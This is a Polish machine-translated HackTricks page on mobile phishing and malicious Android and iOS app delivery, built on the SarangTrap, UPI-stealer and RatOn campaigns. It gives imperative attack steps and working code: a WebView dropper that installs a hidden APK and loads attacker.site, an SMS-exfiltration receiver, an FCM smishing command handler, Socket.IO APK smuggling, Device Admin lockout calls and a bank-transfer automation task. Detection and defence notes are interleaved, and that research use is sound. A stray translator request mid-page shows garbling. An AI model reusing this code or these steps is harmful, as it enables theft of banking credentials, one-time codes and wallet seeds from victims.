# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez threat actors do dystrybucji **malicious Android APKs** oraz **iOS mobile-configuration profiles** przez phishing (SEO, social engineering, fałszywe sklepy, aplikacje randkowe itp.).
> Materiał został zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki podobnych domen (dating, cloud share, car service…).
– Użyj słów kluczowych w lokalnym języku i emoji w elemencie `<title>`, aby lepiej pozycjonować się w Google.
– Hostuj *zarówno* instrukcje instalacji Android (`.apk`), jak i iOS na tej samej landing page.
2. **First Stage Download**
* Android: bezpośredni link do *unsigned* lub „third-party store” APK.
* iOS: `itms-services://` lub zwykły link HTTPS do złośliwego **mobileconfig** profile (patrz niżej).
3. **Post-install Social Engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **invitation / verification code** (iluzja dostępu wyłącznie dla zaproszonych).
* Kod jest **POSTed over HTTP** do Command-and-Control (C2).
* C2 odpowiada `{"success":true}` ➜ malware kontynuuje działanie.
* Sandbox / AV dynamic analysis, które nigdy nie przesyła prawidłowego kodu, nie widzi **żadnego złośliwego zachowania** (ewazja).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions są żądane dopiero **po pozytywnej odpowiedzi z C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Nowsze warianty **usuwają `<uses-permission>` dla SMS z `AndroidManifest.xml`** ale zostawiają ścieżkę w Java/Kotlin, która odczytuje SMS przez reflection ⇒ obniża to wynik w analizie statycznej, a nadal działa na urządzeniach, które przyznały uprawnienie przez `AppOps` abuse lub są starszymi celami.
5. **Facade UI & Background Collection**
* Aplikacja pokazuje niegroźne widoki (SMS viewer, gallery picker) zaimplementowane lokalnie.
* W międzyczasie eksfiltruje:
- IMEI / IMSI, numer telefonu
- Pełny zrzut `ContactsContract` (tablica JSON)
- JPEG/PNG z `/sdcard/DCIM` skompresowane z użyciem [Luban](https://github.com/Curzibn/Luban) w celu zmniejszenia rozmiaru
- Opcjonalnie treść SMS (`content://sms`)
Payloady są **batch-zipped** i wysyłane przez `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Jeden **mobile-configuration profile** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itp., aby zapisać urządzenie w nadzorowaniu podobnym do “MDM”.
* Instrukcje social-engineeringowe:
1. Otwórz Settings ➜ *Profile downloaded*.
2. Stuknij *Install* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niepodpisanemu profilowi ➜ atakujący zyskuje uprawnienia *Contacts* & *Photo* bez przeglądu App Store.
7. **Network Layer**
* Zwykły HTTP, często na porcie 80 z HOST header typu `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Podczas oceny malware zintegruj automatyzację fazy kodu zaproszenia z Frida/Objection, aby dotrzeć do złośliwej gałęzi.
* **Manifest vs. Runtime Diff** – Porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brakujące dangerous perms to czerwony flag.
* **Network Canary** – Skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE` do wykrywania nieregularnych POST burstów po wprowadzeniu kodu.
* **mobileconfig Inspection** – Użyj `security cms -D -i profile.mobileconfig` na macOS, aby wypisać `PayloadContent` i wykryć nadmierne uprawnienia.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** do wykrywania nagłych wysypek domen bogatych w słowa kluczowe.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` od Dalvik klientów spoza Google Play.
* **Invite-code Telemetry** – POSTy 6–8 cyfrowych kodów numerycznych krótko po instalacji APK mogą wskazywać na staging.
* **MobileConfig Signing** – Blokuj unsigned configuration profiles za pomocą polityki MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Wskaźniki (Ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Wzorzec ten był obserwowany w kampaniach wykorzystujących tematy dotyczące świadczeń rządowych w celu kradzieży indyjskich danych UPI i OTP. Operatorzy łączą renomowane platformy, aby zapewnić dostawę i zwiększyć odporność.

### Delivery chain across trusted platforms
- YouTube video lure → w opisie znajduje się krótki link
- Krótki link → strona phishingowa na GitHub Pages podszywająca się pod oficjalny portal
- To samo repozytorium GitHub hostuje APK z fałszywą plakietką “Google Play” linkującą bezpośrednio do pliku
- Dynamiczne strony phishingowe działają na Replit; kanał zdalnych poleceń korzysta z Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Pierwszy APK to installer (dropper), który dostarcza prawdziwe malware w `assets/app.apk` i prosi użytkownika o wyłączenie Wi‑Fi/danych mobilnych, aby osłabić wykrywanie w chmurze.
- The embedded payload instaluje się pod niewinną nazwą (np. “Secure Update”). Po instalacji zarówno installer, jak i payload są obecne jako oddzielne aplikacje.

Wskazówka do triage statycznego (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware pobiera z shortlinka listę aktywnych endpointów w postaci zwykłego tekstu, rozdzielaną przecinkami; proste przekształcenia ciągów znaków tworzą końcową ścieżkę strony phishing.

Przykład (ocenzurowany):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Pozyskiwanie poświadczeń UPI oparte na WebView
- Krok „Wykonaj płatność ₹1 / UPI‑Lite” ładuje złośliwy formularz HTML z dynamicznego endpointa wewnątrz WebView i przechwytuje pola wrażliwe (telefon, bank, UPI PIN), które są `POST`owane do `addup.php`.

Minimalny loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samopropagacja oraz przechwytywanie SMS/OTP
- Na pierwszym uruchomieniu aplikacja żąda agresywnych uprawnień:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakty są przeglądane w pętli w celu masowego wysyłania smishing SMS-ów z urządzenia ofiary.
- Przychodzące SMS-y są przechwytywane przez broadcast receiver i przesyłane wraz z metadanymi (nadawca, treść, slot SIM, losowy identyfikator przypisany do urządzenia) do `/addsm.php`.

Szkic odbiornika:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako odporny C2
- payload rejestruje się w FCM; push messages zawierają pole `_type` używane jako przełącznik do uruchamiania akcji (np. aktualizacja szablonów tekstów phishingowych, przełączanie zachowań).

Przykładowy payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler szkic:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Wzorce wykrywania i IOCs
- APK zawiera dodatkowy payload w `assets/app.apk`
- WebView wczytuje płatność z `gate.htm` i exfiltrates do `/addup.php`
- SMS exfiltration do `/addsm.php`
- Pobieranie konfiguracji sterowane shortlinkiem (np. `rebrand.ly/*`) zwracające CSV endpoints
- Aplikacje oznaczone ogólnie “Update/Secure Update”
- Wiadomości FCM `data` z dyskryminatorem `_type` w niezaufanych aplikacjach

### Pomysły wykrywania i obrony
- Oznacz aplikacje, które instruują użytkowników, by wyłączyli sieć podczas instalacji, a następnie side-loadują drugi APK z `assets/`.
- Generuj alert dla krotki uprawnień: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + przepływów płatności opartych na WebView.
- Monitorowanie egress dla `POST /addup.php|/addsm.php` na hostach spoza środowiska korporacyjnego; blokuj znaną infrastrukturę.
- Reguły Mobile EDR: aplikacja niezaufana rejestrująca się w FCM i rozgałęziająca się na podstawie pola `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fałszywe strony Google Play

Atakujący coraz częściej zastępują statyczne linki do APK kanałem Socket.IO/WebSocket osadzonym w wabikach wyglądających jak Google Play. To ukrywa payload URL, omija filtry URL/rozszerzeń i zachowuje realistyczny UX instalacji.

Typowy przepływ klienta obserwowany w praktyce:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Dlaczego omija proste kontrole:
- Brak statycznego URL APK; payload jest rekonstruowany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń, które blokują bezpośrednie odpowiedzi .apk, mogą przeoczyć dane binarne tunelowane przez WebSockets/Socket.IO.
- Crawlery i sandboksy URL, które nie wykonują WebSockets, nie pobiorą payloadu.

Pomysły na wykrywanie i detekcję:
- Web/network telemetry: oznacz sesje WebSocket, które przesyłają duże kawałki binarne, po których następuje utworzenie Blob z MIME application/vnd.android.package-archive i programatyczne kliknięcie `<a download>`. Szukaj ciągów klienckich takich jak socket.emit('startDownload'), oraz eventów o nazwach chunk, downloadProgress, downloadComplete w skryptach strony.
- Play-store spoof heuristics: na domenach niebędących Google serwujących strony przypominające Play, szukaj Google Play UI strings takich jak http.html:"VfPpkd-jY41G-V67aGc", szablonów mieszanych języków oraz fałszywych „verification/progress” przepływów sterowanych przez zdarzenia WS.
- Kontrole: blokuj dostarczanie APK z non-Google originów; egzekwuj polityki MIME/rozszerzeń obejmujące ruch WebSocket; zachowaj przeglądarkowe monity o bezpiecznym pobieraniu.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Studium przypadku RatOn

Kampania RatOn banker/RAT (ThreatFabric) jest konkretnym przykładem, jak nowoczesne operacje mobile phishing łączą WebView droppers, Accessibility-driven automatyzację UI, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), przejęcie crypto wallet oraz nawet orkiestrację NFC-relay. Ta sekcja abstrahuje techniki nadające się do ponownego użycia.

### Etap-1: WebView → native install bridge (dropper)
Atakujący prezentują WebView wskazujący na złośliwą stronę i wstrzykują interfejs JavaScript, który udostępnia native installer. Kliknięcie przycisku HTML wywołuje native code, który instaluje APK drugiego etapu dołączony do assets droppera i następnie uruchamia go bezpośrednio.

Minimalny wzorzec:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Proszę wklej HTML/treść strony (zawartość pliku src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md), którą mam przetłumaczyć na polski.
```html
<button onclick="bridge.installApk()">Install</button>
```
Po instalacji dropper uruchamia payload za pomocą jawnego package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Pomysł na wykrywanie: niezaufane aplikacje wywołujące `addJavascriptInterface()` i ujawniające metody podobne do instalatora dla WebView; APK zawierające osadzony wtórny ładunek w `assets/` i wywołujące Package Installer Session API.

### Lejek zgody: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 otwiera WebView, który hostuje stronę “Access”. Jej przycisk wywołuje eksportowaną metodę, która przenosi ofiarę do ustawień Accessibility i prosi o włączenie złośliwej usługi. Po przyznaniu, malware używa Accessibility do automatycznego klikania w kolejnych oknach dialogowych z uprawnieniami w czasie działania (contacts, overlay, manage system settings, etc.) i żąda Device Admin.

- Accessibility programowo pomaga zaakceptować późniejsze monity, znajdując przyciski takie jak “Allow”/“OK” w drzewie węzłów i wykonując kliknięcia.
- Sprawdzenie/żądanie uprawnienia overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Zobacz także:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatorzy mogą wydawać polecenia, aby:
- wyświetlić full-screen overlay z URL, lub
- przekazać inline HTML, które jest ładowane do WebView overlay.

Prawdopodobne zastosowania: wymuszenie (PIN entry), otwarcie wallet w celu przechwycenia PIN-ów, wiadomości żądające okupu. Zachowaj polecenie, które upewni się, że overlay permission jest przyznane, jeśli go brakuje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: okresowo zrzucać drzewo Accessibility node, serializować widoczne teksty/role/bounds i wysyłać do C2 jako pseudo-ekran (polecenia takie jak `txt_screen` jednorazowo i `screen_live` ciągłe).
- High-fidelity: żądać MediaProjection i rozpocząć screen-casting/recording na żądanie (polecenia takie jak `display` / `record`).

### ATS playbook (bank app automation)
Mając zadanie w JSON, otwórz aplikację bankową, steruj UI przez Accessibility mieszanką zapytań tekstowych i stuknięć po współrzędnych, i wprowadź PIN płatności ofiary, gdy zostanie poproszony.

Przykładowe zadanie:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Przykładowe teksty widziane w jednym flow celu (CZ → EN):
- "Nová platba" → "Nowa płatność"
- "Zadat platbu" → "Wprowadź płatność"
- "Nový příjemce" → "Nowy odbiorca"
- "Domácí číslo účtu" → "Krajowy numer konta"
- "Další" → "Dalej"
- "Odeslat" → "Wyślij"
- "Ano, pokračovat" → "Tak, kontynuuj"
- "Zaplatit" → "Zapłać"
- "Hotovo" → "Gotowe"

Operatorzy mogą także sprawdzać/podnosić limity przelewów za pomocą poleceń takich jak `check_limit` i `limit`, które poruszają się po interfejsie limitów w podobny sposób.

### Crypto wallet seed extraction
Cele takie jak MetaMask, Trust Wallet, Blockchain.com, Phantom. Przebieg: unlock (skradziony PIN lub dostarczone hasło), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Zaimplementuj selektory uwzględniające lokalizację (EN/RU/CZ/SK), aby ustabilizować nawigację w różnych językach.

### Device Admin coercion
Device Admin APIs są wykorzystywane do zwiększenia możliwości PIN-capture i frustrowania ofiary:

- Natychmiastowe zablokowanie:
```java
dpm.lockNow();
```
- Wygasić bieżące poświadczenie, aby wymusić zmianę (Accessibility przechwytuje nowy PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Wymuś odblokowanie bez użycia biometrii, wyłączając funkcje biometryczne keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Uwaga: Wiele kontroli DevicePolicyManager wymaga Device Owner/Profile Owner na nowszych wersjach Android; niektóre buildy OEM mogą być mniej rygorystyczne. Zawsze weryfikuj na docelowym OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 może zainstalować i uruchomić zewnętrzny moduł relay NFC (np. NFSkate) i nawet przekazać mu szablon HTML, aby poprowadzić ofiarę podczas relaya. To umożliwia bezdotykowy cash-out z kartą obecną przy terminalu równolegle z online ATS.

Tło: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Zestaw poleceń operatora (przykład)
- UI/stan: `txt_screen`, `screen_live`, `display`, `record`
- Społecznościowe: `send_push`, `Facebook`, `WhatsApp`
- Nakładki: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Portfele: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Urządzenie: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Łączność/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Pomysły wykrywania i obrony (w stylu RatOn)
- Szukaj WebViews z `addJavascriptInterface()` ujawniającymi metody instalatora/pozwoleń; stron kończących się na “/access”, które wywołują monity Accessibility.
- Generuj alerty dla aplikacji, które wkrótce po uzyskaniu dostępu do usługi wykonują gesty/kliknięcia Accessibility o dużej częstotliwości; telemetria przypominająca zrzuty węzłów Accessibility wysyłana do C2.
- Monitoruj zmiany polityk Device Admin w nieufnych aplikacjach: `lockNow`, wygaśnięcie hasła, przełączniki funkcji keyguard.
- Alertuj o monitach MediaProjection pochodzących z aplikacji niekorporacyjnych, którym towarzyszą okresowe przesyły klatek.
- Wykrywaj instalację/uruchomienie zewnętrznej aplikacji relay NFC wyzwolonej przez inną aplikację.
- Dla bankowości: egzekwuj potwierdzenia poza pasmem (out-of-band), powiązanie z biometrią oraz limity transakcji odporne na automatyzację na urządzeniu.

## Referencje

- [Mroczna strona romansu: kampania wymuszeń SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – biblioteka kompresji obrazów dla Android](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Dokumentacja](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
